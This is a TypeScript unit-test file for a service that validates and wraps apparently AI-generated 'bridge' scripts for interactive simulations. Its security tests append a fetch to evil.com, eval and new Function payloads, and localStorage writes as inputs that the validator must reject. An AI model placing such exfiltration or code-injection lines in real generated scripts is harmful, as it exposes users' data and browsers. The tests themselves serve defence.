/**
 * Phase 4 unit tests for SimulationService helper functions.
 * Tests pure functions exported from SimulationService — no DB or storage mocks needed.
 */
import { describe, it, expect } from 'vitest';
import {
  buildManifest,
  validateGeneratedBridge,
  normalizeConversationHistory,
  computeSourceHash,
  selectSources,
  formatRetryPrompt,
  wrapBridgeMainBody,
  buildSectionEntry,
  parseSectionEntries,
  wrapBridgeCombined,
  injectBridgeScriptTag,
  assembleSectionBridgeArtifacts,
  SAFE_SECTION_ID_RE,
  type SimManifest,
  type ConversationMessage,
  type GeneratedBridge,
  type ValidationResult,
} from '../SimulationService.js';

// ── Test manifest ─────────────────────────────────────────────────────────────

const baseManifest: SimManifest = {
  controls: [
    { id: 'velocity', type: 'range', label: 'Velocity', min: '0', max: '100', step: '1', aliases: [] },
    { id: 'angle', type: 'range', label: 'Angle', min: '0', max: '90', step: '1', aliases: [] },
  ],
  buttons: [{ id: 'start-btn', label: 'Start' }],
  sections: [],
  renderFunctions: ['redraw', 'draw'],
  updateFunctions: ['updateDerivedPhysics'],
  hasSetSimSection: false,
  selectElements: [],
  checkboxElements: [],
  canvasElements: ['main-canvas'],
  globalObjects: [],
  runtimeGlobals: [],
  instanceMethods: [],
  cssControls: [],
};

// ── A valid minimal bridge ────────────────────────────────────────────────────

const VALID_BRIDGE = `(function () {
  'use strict';
  let _ready = false;
  function _fireReady() {
    if (_ready) return; _ready = true; window._simReadyFired = true;
    window.parent?.postMessage({ type: 'SIM_READY' }, '*');
  }
  if (document.readyState === 'loading')
    document.addEventListener('DOMContentLoaded', () => requestAnimationFrame(_fireReady));
  else requestAnimationFrame(_fireReady);
  setTimeout(_fireReady, 3000);

  let _cancelFn = null;
  const SCRIPTS = {
    main: function (params) {
      const el = document.getElementById('velocity');
      const iv = setInterval(() => {
        el.value = String(parseFloat(el.value) + 1);
        el.dispatchEvent(new Event('input'));
        window.redraw?.();
      }, 60);
      return function cleanup() {
        clearInterval(iv);
      };
    },
  };
  function stopScript() { if (_cancelFn) { _cancelFn(); _cancelFn = null; } }
  function startScript(name, params) { stopScript(); const fn = SCRIPTS[name] ?? SCRIPTS.main; if (fn) _cancelFn = fn(params ?? {}) ?? null; }
  window.SimAPI = { start: startScript, stop: stopScript };
  window.addEventListener('message', e => {
    const { type, script, params } = e.data || {};
    if (type === 'startScript') startScript(script || 'main', params);
    if (type === 'stopScript') stopScript();
    if (type === 'PING_SIM_READY' && window._simReadyFired) window.parent?.postMessage({ type: 'SIM_READY' }, '*');
  });
})();`;

// ── validateGeneratedBridge ───────────────────────────────────────────────────

describe('validateGeneratedBridge', () => {
  it('accepts a valid bridge with no errors', () => {
    const result = validateGeneratedBridge(VALID_BRIDGE, baseManifest);
    expect(result.fatal).toHaveLength(0);
    // clearInterval is present → no interval warning
    expect(result.warnings.filter(w => w.includes('setInterval'))).toHaveLength(0);
  });

  it('detects syntax errors as fatal', () => {
    const broken = VALID_BRIDGE.replace('const SCRIPTS =', 'const SCRIPTS =====');
    const result = validateGeneratedBridge(broken, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('syntax'))).toBe(true);
  });

  it('detects missing SIM_READY as fatal', () => {
    // Replace all occurrences so none remain
    const code = VALID_BRIDGE.replace(/SIM_READY/g, 'SIM_GONE');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.includes('SIM_READY'))).toBe(true);
  });

  it('detects missing startScript handler as fatal', () => {
    const code = VALID_BRIDGE.replace(/startScript/g, '_START_');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.includes('startScript'))).toBe(true);
  });

  it('detects missing stopScript handler as fatal', () => {
    const code = VALID_BRIDGE.replace(/stopScript/g, '_STOP_');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.includes('stopScript'))).toBe(true);
  });

  it('detects missing SCRIPTS object as fatal when not in assembled code', () => {
    // With deterministic wrapping, SCRIPTS is always in the assembled code.
    // This test verifies the check still works if the assembled code somehow lacks SCRIPTS.
    // We test via the cleanup return check instead (since mainBody is empty without return).
    const codeNoReturn = VALID_BRIDGE.replace('return function cleanup()', '// no return');
    const result = validateGeneratedBridge(codeNoReturn, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('cleanup'))).toBe(true);
  });

  it('warns when getElementById uses ID not in manifest', () => {
    const code = VALID_BRIDGE.replace("getElementById('velocity')", "getElementById('nonexistent-id')");
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('nonexistent-id'))).toBe(true);
  });

  it('warns when setInterval is used but cleanup has no clearInterval', () => {
    const code = VALID_BRIDGE.replace('clearInterval(iv);', '// no cleanup');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('setInterval'))).toBe(true);
  });

  it('does NOT warn for window.redraw?.() when redraw is in manifest', () => {
    const result = validateGeneratedBridge(VALID_BRIDGE, baseManifest);
    expect(result.warnings.some(w => w.includes('redraw'))).toBe(false);
  });
});

// ── normalizeConversationHistory ──────────────────────────────────────────────

describe('normalizeConversationHistory', () => {
  it('passes through clean history unchanged', () => {
    const history: ConversationMessage[] = [
      { role: 'user',      content: 'animate velocity' },
      { role: 'assistant', content: 'Bridge for: "animate velocity". Length: 1200 chars.' },
    ];
    const result = normalizeConversationHistory(history);
    expect(result).toEqual(history);
  });

  it('strips source files from old user messages', () => {
    const history: ConversationMessage[] = [
      {
        role: 'user',
        content: '## SIMULATION SOURCE FILES\n\n```html\n<html>...</html>\n```\n\nSECTION PROMPT: animate velocity\n\nsimpleUi = true',
      },
    ];
    const result = normalizeConversationHistory(history);
    expect(result[0].content).toBe('animate velocity');
    expect(result[0].content).not.toContain('SIMULATION SOURCE FILES');
  });

  it('replaces raw bridge JS in assistant messages with placeholder', () => {
    const history: ConversationMessage[] = [
      {
        role: 'assistant',
        content: '(function () { const SCRIPTS = { main: function(params) { /* long bridge code */ return function cleanup() {}; } }; })();',
      },
    ];
    const result = normalizeConversationHistory(history);
    expect(result[0].content).toContain('[Previous bridge generated');
    expect(result[0].content).not.toContain('(function');
  });

  it('handles mixed clean and dirty history', () => {
    const history: ConversationMessage[] = [
      { role: 'user',      content: 'animate velocity' },
      { role: 'assistant', content: '(function() { ... very long bridge code ... long long })();' },
      { role: 'user',      content: 'also hide the legend' },
    ];
    const result = normalizeConversationHistory(history);
    expect(result[0].content).toBe('animate velocity');
    expect(result[1].content).toContain('[Previous bridge generated');
    expect(result[2].content).toBe('also hide the legend');
  });
});

// ── buildManifest — modern JS detection ──────────────────────────────────────

describe('buildManifest — JS function detection', () => {
  it('detects named functions', () => {
    const src = new Map([['sim.js', 'function redraw() { canvas.clear(); }']]);
    const manifest = buildManifest(src);
    expect(manifest.renderFunctions).toContain('redraw');
  });

  it('detects arrow function assignments', () => {
    const src = new Map([['sim.js', 'const redraw = () => { canvas.clear(); }']]);
    const manifest = buildManifest(src);
    expect(manifest.renderFunctions).toContain('redraw');
  });

  it('detects const = function assignments', () => {
    const src = new Map([['sim.js', 'const draw = function() { ctx.fillRect(0, 0, 100, 100); }']]);
    const manifest = buildManifest(src);
    expect(manifest.renderFunctions).toContain('draw');
  });

  it('detects async arrow functions', () => {
    const src = new Map([['sim.js', 'const render = async () => { await paintFrame(); }']]);
    const manifest = buildManifest(src);
    expect(manifest.renderFunctions).toContain('render');
  });

  it('detects exported functions', () => {
    const src = new Map([['sim.js', 'export function redraw() { canvas.clear(); }']]);
    const manifest = buildManifest(src);
    expect(manifest.renderFunctions).toContain('redraw');
  });

  it('detects updateDerivedPhysics variants', () => {
    const src = new Map([['sim.js', 'const updateDerivedPhysics = () => { vx = v * Math.cos(theta); }']]);
    const manifest = buildManifest(src);
    expect(manifest.updateFunctions).toContain('updateDerivedPhysics');
  });

  it('detects global library objects', () => {
    const src = new Map([['sim.js', 'Plotly.newPlot("chart", data, layout);']]);
    const manifest = buildManifest(src);
    expect(manifest.globalObjects).toContain('Plotly');
  });

  it('detects select elements', () => {
    const html = '<select id="mode"><option>A</option><option>B</option></select>';
    const src = new Map([['index.html', html]]);
    const manifest = buildManifest(src);
    expect(manifest.selectElements.some(s => s.id === 'mode')).toBe(true);
  });

  it('detects canvas elements', () => {
    const html = '<canvas id="main-canvas" width="800" height="600"></canvas>';
    const src = new Map([['index.html', html]]);
    const manifest = buildManifest(src);
    expect(manifest.canvasElements).toContain('main-canvas');
  });
});

// ── computeSourceHash ─────────────────────────────────────────────────────────

describe('computeSourceHash', () => {
  it('produces the same hash regardless of Map insertion order', () => {
    const mapA = new Map([['a.js', 'alpha'], ['b.js', 'beta']]);
    const mapB = new Map([['b.js', 'beta'], ['a.js', 'alpha']]);
    expect(computeSourceHash(mapA)).toBe(computeSourceHash(mapB));
  });

  it('changes hash when a file path is renamed (even if content stays the same)', () => {
    const mapA = new Map([['main.js', 'const x = 1;']]);
    const mapB = new Map([['renamed.js', 'const x = 1;']]);
    expect(computeSourceHash(mapA)).not.toBe(computeSourceHash(mapB));
  });

  it('changes hash when file content changes', () => {
    const mapA = new Map([['sim.js', 'const x = 1;']]);
    const mapB = new Map([['sim.js', 'const x = 2;']]);
    expect(computeSourceHash(mapA)).not.toBe(computeSourceHash(mapB));
  });

  it('is stable across multiple calls with same input', () => {
    const map = new Map([['index.html', '<h1>sim</h1>'], ['app.js', 'const x = 1;']]);
    expect(computeSourceHash(map)).toBe(computeSourceHash(map));
  });

  it('normalizes Windows line endings (CRLF → LF) for cross-platform consistency', () => {
    const mapCrlf = new Map([['app.js', 'const x = 1;\r\nconst y = 2;']]);
    const mapLf   = new Map([['app.js', 'const x = 1;\nconst y = 2;']]);
    expect(computeSourceHash(mapCrlf)).toBe(computeSourceHash(mapLf));
  });
});

// ── selectSources ─────────────────────────────────────────────────────────────

describe('selectSources', () => {
  const noSectionFilter = (_k: string) => false;

  it('always includes HTML entry files', () => {
    const raw = new Map([['sim/index.html', '<html>hi</html>'], ['sim/app.js', 'const x = 1;']]);
    const { sourceMap } = selectSources(raw, noSectionFilter);
    expect([...sourceMap.keys()]).toContain('sim/index.html');
  });

  it('excludes section-specific files', () => {
    const isSectionFile = (k: string) => /section_[^/]+\.(html|js)$/.test(k);
    const raw = new Map([
      ['sim/index.html', '<html/>'],
      ['sim/section_abc123.js', '(function(){})();'],
    ]);
    const { sourceMap } = selectSources(raw, isSectionFile);
    expect([...sourceMap.keys()]).not.toContain('sim/section_abc123.js');
  });

  it('returns sourceMap sorted by path regardless of insertion order', () => {
    const raw = new Map([
      ['sim/z.js', 'const z = 1;'],
      ['sim/a.js', 'const a = 1;'],
      ['sim/index.html', '<html/>'],
    ]);
    const { sourceMap } = selectSources(raw, noSectionFilter);
    const keys = [...sourceMap.keys()];
    expect(keys).toEqual([...keys].sort((a, b) => a.localeCompare(b)));
  });

  it('sets contextTruncated=false when content is within budget', () => {
    const raw = new Map([['sim/index.html', '<html>small</html>']]);
    const { contextTruncated } = selectSources(raw, noSectionFilter);
    expect(contextTruncated).toBe(false);
  });

  it('scores and prefers main JS files over utilities', () => {
    const raw = new Map([
      ['sim/index.html',  '<html/>'],
      ['sim/main.js',     'const main = 1;'],
      ['sim/utils.js',    'const util = 1;'],
    ]);
    const { sourceMap } = selectSources(raw, noSectionFilter);
    // Both should be included when budget allows
    expect([...sourceMap.keys()]).toContain('sim/main.js');
  });
});

// ── normalizeConversationHistory — multi-line prompt support ──────────────────

describe('normalizeConversationHistory — multi-line prompts', () => {
  it('extracts a multi-line user prompt from old source-heavy messages', () => {
    const history: ConversationMessage[] = [
      {
        role: 'user',
        content: [
          '## SIMULATION SOURCE FILES',
          '',
          '### index.html',
          '```html',
          '<html>...</html>',
          '```',
          '',
          'SECTION PROMPT: animate the velocity slider',
          'showing the projectile motion over time',
          'while keeping angle visible',
          '',
          'simpleUi = true',
        ].join('\n'),
      },
    ];
    const result = normalizeConversationHistory(history);
    const normalized = result[0].content;
    expect(normalized).toContain('animate the velocity slider');
    expect(normalized).not.toContain('SIMULATION SOURCE FILES');
    expect(normalized).not.toContain('index.html');
  });

  it('handles REFINEMENT PROMPT prefix', () => {
    const history: ConversationMessage[] = [
      {
        role: 'user',
        content: '## SIMULATION SOURCE FILES\n\n### app.js\n```\ncode\n```\n\nREFINEMENT PROMPT: also hide the legend\n\nsimpleUi = true',
      },
    ];
    const result = normalizeConversationHistory(history);
    expect(result[0].content).toBe('also hide the legend');
  });

  it('falls back to [previous prompt] when no recognizable prompt is found', () => {
    const history: ConversationMessage[] = [
      { role: 'user', content: '## SIMULATION SOURCE FILES\n\n```js\ncode\n```' },
    ];
    const result = normalizeConversationHistory(history);
    expect(result[0].content).toBe('[previous prompt]');
  });
});

// ── validateGeneratedBridge — security checks ─────────────────────────────────

describe('validateGeneratedBridge — security', () => {
  it('flags fetch() as fatal', () => {
    const code = VALID_BRIDGE + '\nfetch("https://evil.com/data");';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('fetch'))).toBe(true);
  });

  it('flags eval() as fatal', () => {
    const code = VALID_BRIDGE + '\neval("alert(1)");';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('eval'))).toBe(true);
  });

  it('flags localStorage as fatal', () => {
    const code = VALID_BRIDGE + '\nlocalStorage.setItem("k","v");';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('localstorage'))).toBe(true);
  });

  it('flags new Function() as fatal', () => {
    const code = VALID_BRIDGE + '\nnew Function("alert(1)")();';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('function'))).toBe(true);
  });

  it('accepts clean code with no security violations', () => {
    const result = validateGeneratedBridge(VALID_BRIDGE, baseManifest);
    const securityFatals = result.fatal.filter(e => e.startsWith('Security:'));
    expect(securityFatals).toHaveLength(0);
  });
});

// ── validateGeneratedBridge — standard protocol protection ───────────────────

describe('validateGeneratedBridge — standard protocol', () => {
  it('detects missing message listener as fatal', () => {
    const code = VALID_BRIDGE
      .replace("window.addEventListener('message'", "window.addEventListener('keydown'")
      .replace('window.addEventListener("message"', 'window.addEventListener("keydown"');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('listener'))).toBe(true);
  });

  it('detects missing message listener as fatal', () => {
    // System-owned listener check — should fail if the listener is removed
    const code = VALID_BRIDGE
      .replace("window.addEventListener('message'", "window.addEventListener('keyup'")
      .replace('window.addEventListener("message"', 'window.addEventListener("keyup"');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.fatal.some(e => e.toLowerCase().includes('listener'))).toBe(true);
  });
});

// ── validateGeneratedBridge — window.fn detection (both forms) ───────────────

describe('validateGeneratedBridge — window function detection', () => {
  it('detects window.fn?.() not in manifest as warning', () => {
    const code = VALID_BRIDGE.replace('window.redraw?.()', 'window.unknownFnOptional?.()');
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('unknownFnOptional'))).toBe(true);
  });

  it('detects window.fn() (direct call, no optional chaining) not in manifest as warning', () => {
    // Append a direct call — not in manifest
    const code = VALID_BRIDGE + '\nwindow.unknownFnDirect();';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('unknownFnDirect'))).toBe(true);
  });

  it('does NOT warn for window.redraw?.() when redraw is in manifest', () => {
    const result = validateGeneratedBridge(VALID_BRIDGE, baseManifest);
    expect(result.warnings.some(w => w.includes('redraw'))).toBe(false);
  });
});

// ── validateGeneratedBridge — cleanup side-effect pairs ──────────────────────

describe('validateGeneratedBridge — cleanup completeness', () => {
  it('warns when addEventListener used without removeEventListener', () => {
    const code = VALID_BRIDGE + '\ndocument.getElementById("velocity").addEventListener("change", () => {});';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('removeEventListener'))).toBe(true);
  });

  it('does NOT warn when both addEventListener and removeEventListener are present', () => {
    const code = VALID_BRIDGE +
      '\ndocument.getElementById("velocity").addEventListener("change", handler);' +
      '\ndocument.getElementById("velocity").removeEventListener("change", handler);';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('removeEventListener'))).toBe(false);
  });

  it('warns when insertAdjacentHTML used without .remove()', () => {
    const code = VALID_BRIDGE + '\ndocument.body.insertAdjacentHTML("beforeend", "<div>hi</div>");';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('DOM injection'))).toBe(true);
  });

  it('warns when classList.add used without classList.remove', () => {
    const code = VALID_BRIDGE + '\ndocument.getElementById("velocity").classList.add("active");';
    const result = validateGeneratedBridge(code, baseManifest);
    expect(result.warnings.some(w => w.includes('classList'))).toBe(true);
  });
});

// ── formatRetryPrompt ─────────────────────────────────────────────────────────

describe('formatRetryPrompt', () => {
  const fakeBridge: GeneratedBridge = {
    message: 'test bridge',
    mainBody: 'const el = document.getElementById("velocity"); return function cleanup() { el.style.display = ""; };',
    confidence: 0.4,
    warnings: [],
  };

  it('includes fatal errors in the output', () => {
    const validation: ValidationResult = {
      fatal: ['Syntax error: Unexpected token', 'Missing SCRIPTS.main'],
      warnings: [],
      weak: [],
    };
    const prompt = formatRetryPrompt(validation, fakeBridge, 'animate velocity', 'fatal_validation');
    expect(prompt).toContain('Syntax error');
    expect(prompt).toContain('Missing SCRIPTS.main');
  });

  it('includes strong warnings in the output', () => {
    const validation: ValidationResult = {
      fatal: [],
      warnings: ["setInterval used but clearInterval not found"],
      weak: [],
    };
    const prompt = formatRetryPrompt(validation, fakeBridge, 'animate', 'strong_warning');
    expect(prompt).toContain('clearInterval');
    expect(prompt).toContain('STRONG WARNINGS');
  });

  it('does NOT include source files instruction (they stay in context)', () => {
    const validation: ValidationResult = { fatal: ['err'], warnings: [], weak: [] };
    const prompt = formatRetryPrompt(validation, fakeBridge, 'animate', 'fatal_validation');
    expect(prompt.toLowerCase()).toContain('source files');
    expect(prompt).not.toContain('## SIMULATION SOURCE FILES');
  });

  it('instructs to preserve standard protocol', () => {
    const validation: ValidationResult = { fatal: ['err'], warnings: [], weak: [] };
    const prompt = formatRetryPrompt(validation, fakeBridge, 'animate', 'fatal_validation');
    expect(prompt).toContain('SIM_READY');
    expect(prompt).toContain('startScript');
    expect(prompt).toContain('stopScript');
    expect(prompt).toContain('cleanup');
  });
});

// ── wrapBridgeMainBody — deterministic bridge wrapper ─────────────────────────

describe('wrapBridgeMainBody', () => {
  const body = 'const el = document.getElementById("velocity");\nreturn function cleanup() { el.style.display = ""; };';

  it('always includes SIM_READY behavior', () => {
    const result = wrapBridgeMainBody(body);
    expect(result).toContain('SIM_READY');
    expect(result).toContain('_fireReady');
  });

  it('always includes startScript and stopScript', () => {
    const result = wrapBridgeMainBody(body);
    expect(result).toContain('startScript');
    expect(result).toContain('stopScript');
  });

  it('always includes the message listener', () => {
    const result = wrapBridgeMainBody(body);
    expect(result).toContain("window.addEventListener('message'");
  });

  it('always includes window.SimAPI', () => {
    const result = wrapBridgeMainBody(body);
    expect(result).toContain('window.SimAPI');
  });

  it('includes the LLM-generated body inside SCRIPTS.main', () => {
    const result = wrapBridgeMainBody(body);
    expect(result).toContain('document.getElementById("velocity")');
    expect(result).toContain('SCRIPTS');
  });

  it('produces valid syntax for any mainBody', () => {
    const simpleBody = 'return function cleanup() {};';
    const result = wrapBridgeMainBody(simpleBody);
    expect(() => new Function(result)).not.toThrow();
  });

  it('is deterministic — same body always produces the same script', () => {
    expect(wrapBridgeMainBody(body)).toBe(wrapBridgeMainBody(body));
  });

  it('assembled output passes validateGeneratedBridge with no fatal errors', () => {
    const result = wrapBridgeMainBody(body);
    const validation = validateGeneratedBridge(result, baseManifest, body);
    expect(validation.fatal).toHaveLength(0);
  });
});

// ── SAFE_SECTION_ID_RE ────────────────────────────────────────────────────────

describe('SAFE_SECTION_ID_RE', () => {
  it('accepts UUIDs', () => {
    expect(SAFE_SECTION_ID_RE.test('98fd5b48-c7cd-45d8-a1b2-4bd8703050b0')).toBe(true);
  });
  it('accepts slugs', () => {
    expect(SAFE_SECTION_ID_RE.test('intro_forces')).toBe(true);
  });
  it('rejects slashes', () => {
    expect(SAFE_SECTION_ID_RE.test('a/b')).toBe(false);
  });
  it('rejects spaces', () => {
    expect(SAFE_SECTION_ID_RE.test('my section')).toBe(false);
  });
});

// ── buildSectionEntry ─────────────────────────────────────────────────────────

describe('buildSectionEntry', () => {
  const id = 'abc-123';
  const body = 'const el = document.getElementById("velocity");\nreturn function cleanup() {};';

  it('contains the sectionId markers', () => {
    const entry = buildSectionEntry(id, body);
    expect(entry).toContain(`@@SIM_BRIDGE:${id}@@`);
    expect(entry).toContain(`@@/SIM_BRIDGE:${id}@@`);
  });

  it('contains the mainBody content', () => {
    const entry = buildSectionEntry(id, body);
    expect(entry).toContain('getElementById("velocity")');
  });

  it('throws for unsafe sectionId', () => {
    expect(() => buildSectionEntry('bad/id', 'return null;')).toThrow('Unsafe sectionId');
  });
});

// ── parseSectionEntries ───────────────────────────────────────────────────────

describe('parseSectionEntries', () => {
  it('returns empty map for empty string', () => {
    expect(parseSectionEntries('').size).toBe(0);
  });

  it('round-trips: buildSectionEntry then parse returns original mainBody', () => {
    const id = 'section-uuid-1';
    const body = 'const x = 1;\nreturn function cleanup() { x; };';
    const entry = buildSectionEntry(id, body);
    // Wrap in a minimal bridge structure so parser can find it
    const bridgeJs = `var __SECTIONS__ = {\n${entry}\n};`;
    const map = parseSectionEntries(bridgeJs);
    expect(map.has(id)).toBe(true);
    expect(map.get(id)).toContain('const x = 1;');
  });

  it('parses multiple sections independently', () => {
    const entryA = buildSectionEntry('sec-a', 'return function cleanup() { /* A */ };');
    const entryB = buildSectionEntry('sec-b', 'return function cleanup() { /* B */ };');
    const bridgeJs = `var __SECTIONS__ = {\n${entryA}\n${entryB}\n};`;
    const map = parseSectionEntries(bridgeJs);
    expect(map.size).toBe(2);
    expect(map.has('sec-a')).toBe(true);
    expect(map.has('sec-b')).toBe(true);
  });
});

// ── wrapBridgeCombined ────────────────────────────────────────────────────────

describe('wrapBridgeCombined', () => {
  const entries = new Map([
    ['sec-1', 'return function cleanup() { /* sec1 */ };'],
    ['sec-2', 'return function cleanup() { /* sec2 */ };'],
  ]);

  it('produces valid JS syntax', () => {
    const result = wrapBridgeCombined(entries);
    expect(() => new Function(result)).not.toThrow();
  });

  it('contains SIM_READY', () => {
    expect(wrapBridgeCombined(entries)).toContain('SIM_READY');
  });

  it('contains both section IDs', () => {
    const result = wrapBridgeCombined(entries);
    expect(result).toContain('sec-1');
    expect(result).toContain('sec-2');
  });

  it('contains URLSearchParams dispatch', () => {
    expect(wrapBridgeCombined(entries)).toContain('URLSearchParams');
  });

  it('is deterministic', () => {
    expect(wrapBridgeCombined(entries)).toBe(wrapBridgeCombined(entries));
  });

  it('add-replace: regenerating sec-1 does not lose sec-2', () => {
    const initial = wrapBridgeCombined(entries);
    const parsed  = parseSectionEntries(initial);
    parsed.set('sec-1', 'return function cleanup() { /* updated sec1 */ };');
    const updated = wrapBridgeCombined(parsed);
    expect(updated).toContain('updated sec1');
    expect(updated).toContain('sec-2');
  });
});

// ── injectBridgeScriptTag ─────────────────────────────────────────────────────

describe('injectBridgeScriptTag', () => {
  const relPath = './bridge.js';
  const hash    = 'abc123';

  it('injects marker block before </body>', () => {
    const html   = '<html><body><p>hi</p></body></html>';
    const result = injectBridgeScriptTag(html, relPath, hash);
    expect(result).toContain('SIM_BRIDGE_SCRIPT_START');
    expect(result).toContain(`src="./bridge.js?v=abc123"`);
    expect(result.indexOf('SIM_BRIDGE_SCRIPT_START')).toBeLessThan(result.indexOf('</body>'));
  });

  it('replaces existing marker block (no duplicate)', () => {
    const html  = '<html><body><!-- SIM_BRIDGE_SCRIPT_START -->\n<script src="./bridge.js?v=old"></script>\n<!-- SIM_BRIDGE_SCRIPT_END -->\n</body></html>';
    const result = injectBridgeScriptTag(html, relPath, 'newhash');
    expect(result).toContain('newhash');
    expect(result).not.toContain('?v=old');
    expect((result.match(/SIM_BRIDGE_SCRIPT_START/g) ?? []).length).toBe(1);
  });

  it('strips old section_*.js script tags on first injection', () => {
    const html = '<html><body><script src="./section_uuid123.js?v=x"></script></body></html>';
    const result = injectBridgeScriptTag(html, relPath, hash);
    expect(result).not.toContain('section_uuid123.js');
    expect(result).toContain('bridge.js');
  });

  it('works with single-quoted src attributes', () => {
    const html = "<html><body><script src='./section_x.js'></script></body></html>";
    const result = injectBridgeScriptTag(html, relPath, hash);
    expect(result).not.toContain('section_x.js');
  });

  it('appends after body if </body> is missing', () => {
    const html   = '<html><body><p>no close</p>';
    const result = injectBridgeScriptTag(html, relPath, hash);
    expect(result).toContain('SIM_BRIDGE_SCRIPT_START');
  });
});

// ── selectSources — bridge.js exclusion ──────────────────────────────────────

describe('selectSources — bridge.js exclusion', () => {
  it('excludes bridge.js from AI context', () => {
    const isSectionFile = (k: string) =>
      /section_[^/]+\.(html|js)$/.test(k) || /\/bridge\.js$/.test(k);
    const raw = new Map([
      ['sim/index.html', '<html/>'],
      ['sim/app.js',     'const x = 1;'],
      ['sim/bridge.js',  '(function(){})();'],
    ]);
    const { sourceMap } = selectSources(raw, isSectionFile);
    expect([...sourceMap.keys()]).not.toContain('sim/bridge.js');
    expect([...sourceMap.keys()]).toContain('sim/app.js');
  });
});

// ── Bridge acknowledgement capability (audit P0.5) ────────────────────────────
//
// The viewer's apply gate now consults a PUBLISHED capability before a package's first activation,
// so "does this bridge post SCRIPT_APPLIED?" stopped being a curiosity and became an input to what
// a viewer is shown. Two consequences are pinned here: the assembler reports the answer about the
// bytes it just produced, and the validator refuses to publish a dynamic bridge that lost the ack.

describe('assembleSectionBridgeArtifacts reports what the assembled bridge can do', () => {
  const assemble = (existingBridgeJs = '', rawEntryHtml = '<html><head></head><body></body></html>') =>
    assembleSectionBridgeArtifacts({
      sectionId: 'sec-1',
      existingBridgeJs,
      rawEntryHtml,
      entryRelPath: 'index.html',
      mainBody: () => 'return function cleanup() {};',
    });

  it('reports scriptApplied for the bridge it actually emits', () => {
    const art = assemble();
    expect(art.capabilities.scriptApplied).toBe(true);
    // Not a claim about the template's source — a claim about the BYTES being uploaded.
    expect(art.bridgeJs).toContain('SCRIPT_APPLIED');
  });

  it('the reported capability is derived from the emitted bytes, not hard-coded', () => {
    // If this ever diverges the capability becomes a lie the viewer acts on, so the two are checked
    // against each other rather than each against a constant.
    const art = assemble();
    expect(art.capabilities.scriptApplied).toBe(/_post\s*\(\s*\{[^}]*type\s*:\s*'SCRIPT_APPLIED'/.test(art.bridgeJs));
  });

  // ── The entry document's own answer (audit P0.8) ──────────────────────────────────────────
  //
  // The flagship packages resolve `three` through `<script type="importmap">`, which WebKit only
  // supports from Safari/iOS 16.4. On anything older the bare specifier never resolves, no module
  // evaluates and nothing paints — so the requirement is recorded here, with the bridge's ack, in
  // the record that travels with these exact bytes.

  it('records the import-map requirement of the entry it publishes', () => {
    const withMap = assemble('', '<html><head><script type="importmap">{"imports":{}}</script></head><body></body></html>');
    expect(withMap.capabilities.requiresImportMaps).toBe(true);
    // Both facts, one record, one metadata key — never a second channel to keep in step.
    expect(withMap.capabilities.scriptApplied).toBe(true);
  });

  it('records the honest FALSE for an entry that needs nothing', () => {
    // Not `undefined`: the assembler READ this document and found no import map, and that is a
    // different statement from "nobody has ever looked". Only the second may reach the viewer as
    // unknown, and only unknown is exempt from the floor.
    expect(assemble().capabilities.requiresImportMaps).toBe(false);
  });

  it('does not mistake the module script every entry has for an import map', () => {
    // `type="module"` sits on essentially every modern entry document and needs no import map.
    // Matching it would poster-only a huge share of packages on older browsers for nothing.
    const modules = assemble('', '<html><head><script type="module" src="./main.js"></script></head><body></body></html>');
    expect(modules.capabilities.requiresImportMaps).toBe(false);
  });

  it('describes the INJECTED entry, not the raw upload', () => {
    // The assembler rewrites the document (rAF gate, bridge tag, stale-tag stripping) and those
    // bytes are what gets uploaded. A record derived from the input would be a claim about a
    // document no viewer will ever load.
    const art = assemble('', '<html><head><script type="importmap">{}</script></head><body></body></html>');
    expect(art.entryHtml).toContain('SIM_BRIDGE_SCRIPT_START');
    expect(art.capabilities.requiresImportMaps).toBe(art.entryHtml.includes('type="importmap"'));
  });
});

describe('validateGeneratedBridge — a dynamic bridge that cannot acknowledge is a system error', () => {
  const dynamicBridge = (over = (s: string) => s) => over(assembleSectionBridgeArtifacts({
    sectionId: 'sec-1',
    existingBridgeJs: '',
    rawEntryHtml: '<html><head></head><body></body></html>',
    entryRelPath: 'index.html',
    mainBody: () => 'return function cleanup() {};',
  }).bridgeJs);

  // The security checks run on the LLM-written mainBody, exactly as the publication path calls
  // this (the embedded v3 runtime legitimately uses APIs a section body may not).
  const MAIN_BODY = 'return function cleanup() {};';

  it('passes the bridge the assembler produces', () => {
    const result = validateGeneratedBridge(dynamicBridge(), baseManifest, MAIN_BODY);
    expect(result.fatal).toEqual([]);
  });

  it('is FATAL when the acknowledgement is missing from a dynamic bridge', () => {
    // A template regression here would not merely lose a message: publication would record the
    // package as PROVEN-SILENT, which tells the viewer's gate to reveal a switch it can no longer
    // verify — for every package published afterwards, silently.
    const stripped = dynamicBridge((code) => code.replace(/type: 'SCRIPT_APPLIED'/g, "type: 'NOPE'"));
    const result = validateGeneratedBridge(stripped, baseManifest, MAIN_BODY);
    expect(result.fatal.some((f) => /SCRIPT_APPLIED/.test(f))).toBe(true);
  });

  it('does NOT demand it of a non-dynamic bridge', () => {
    // Scoped exactly as the uiPolicy/autoPolicy checks are: a load-time-locked bridge from the
    // pre-combined wrapper cannot switch sections in place either, so demanding an in-place
    // acknowledgement from it would be a requirement no publication path can satisfy.
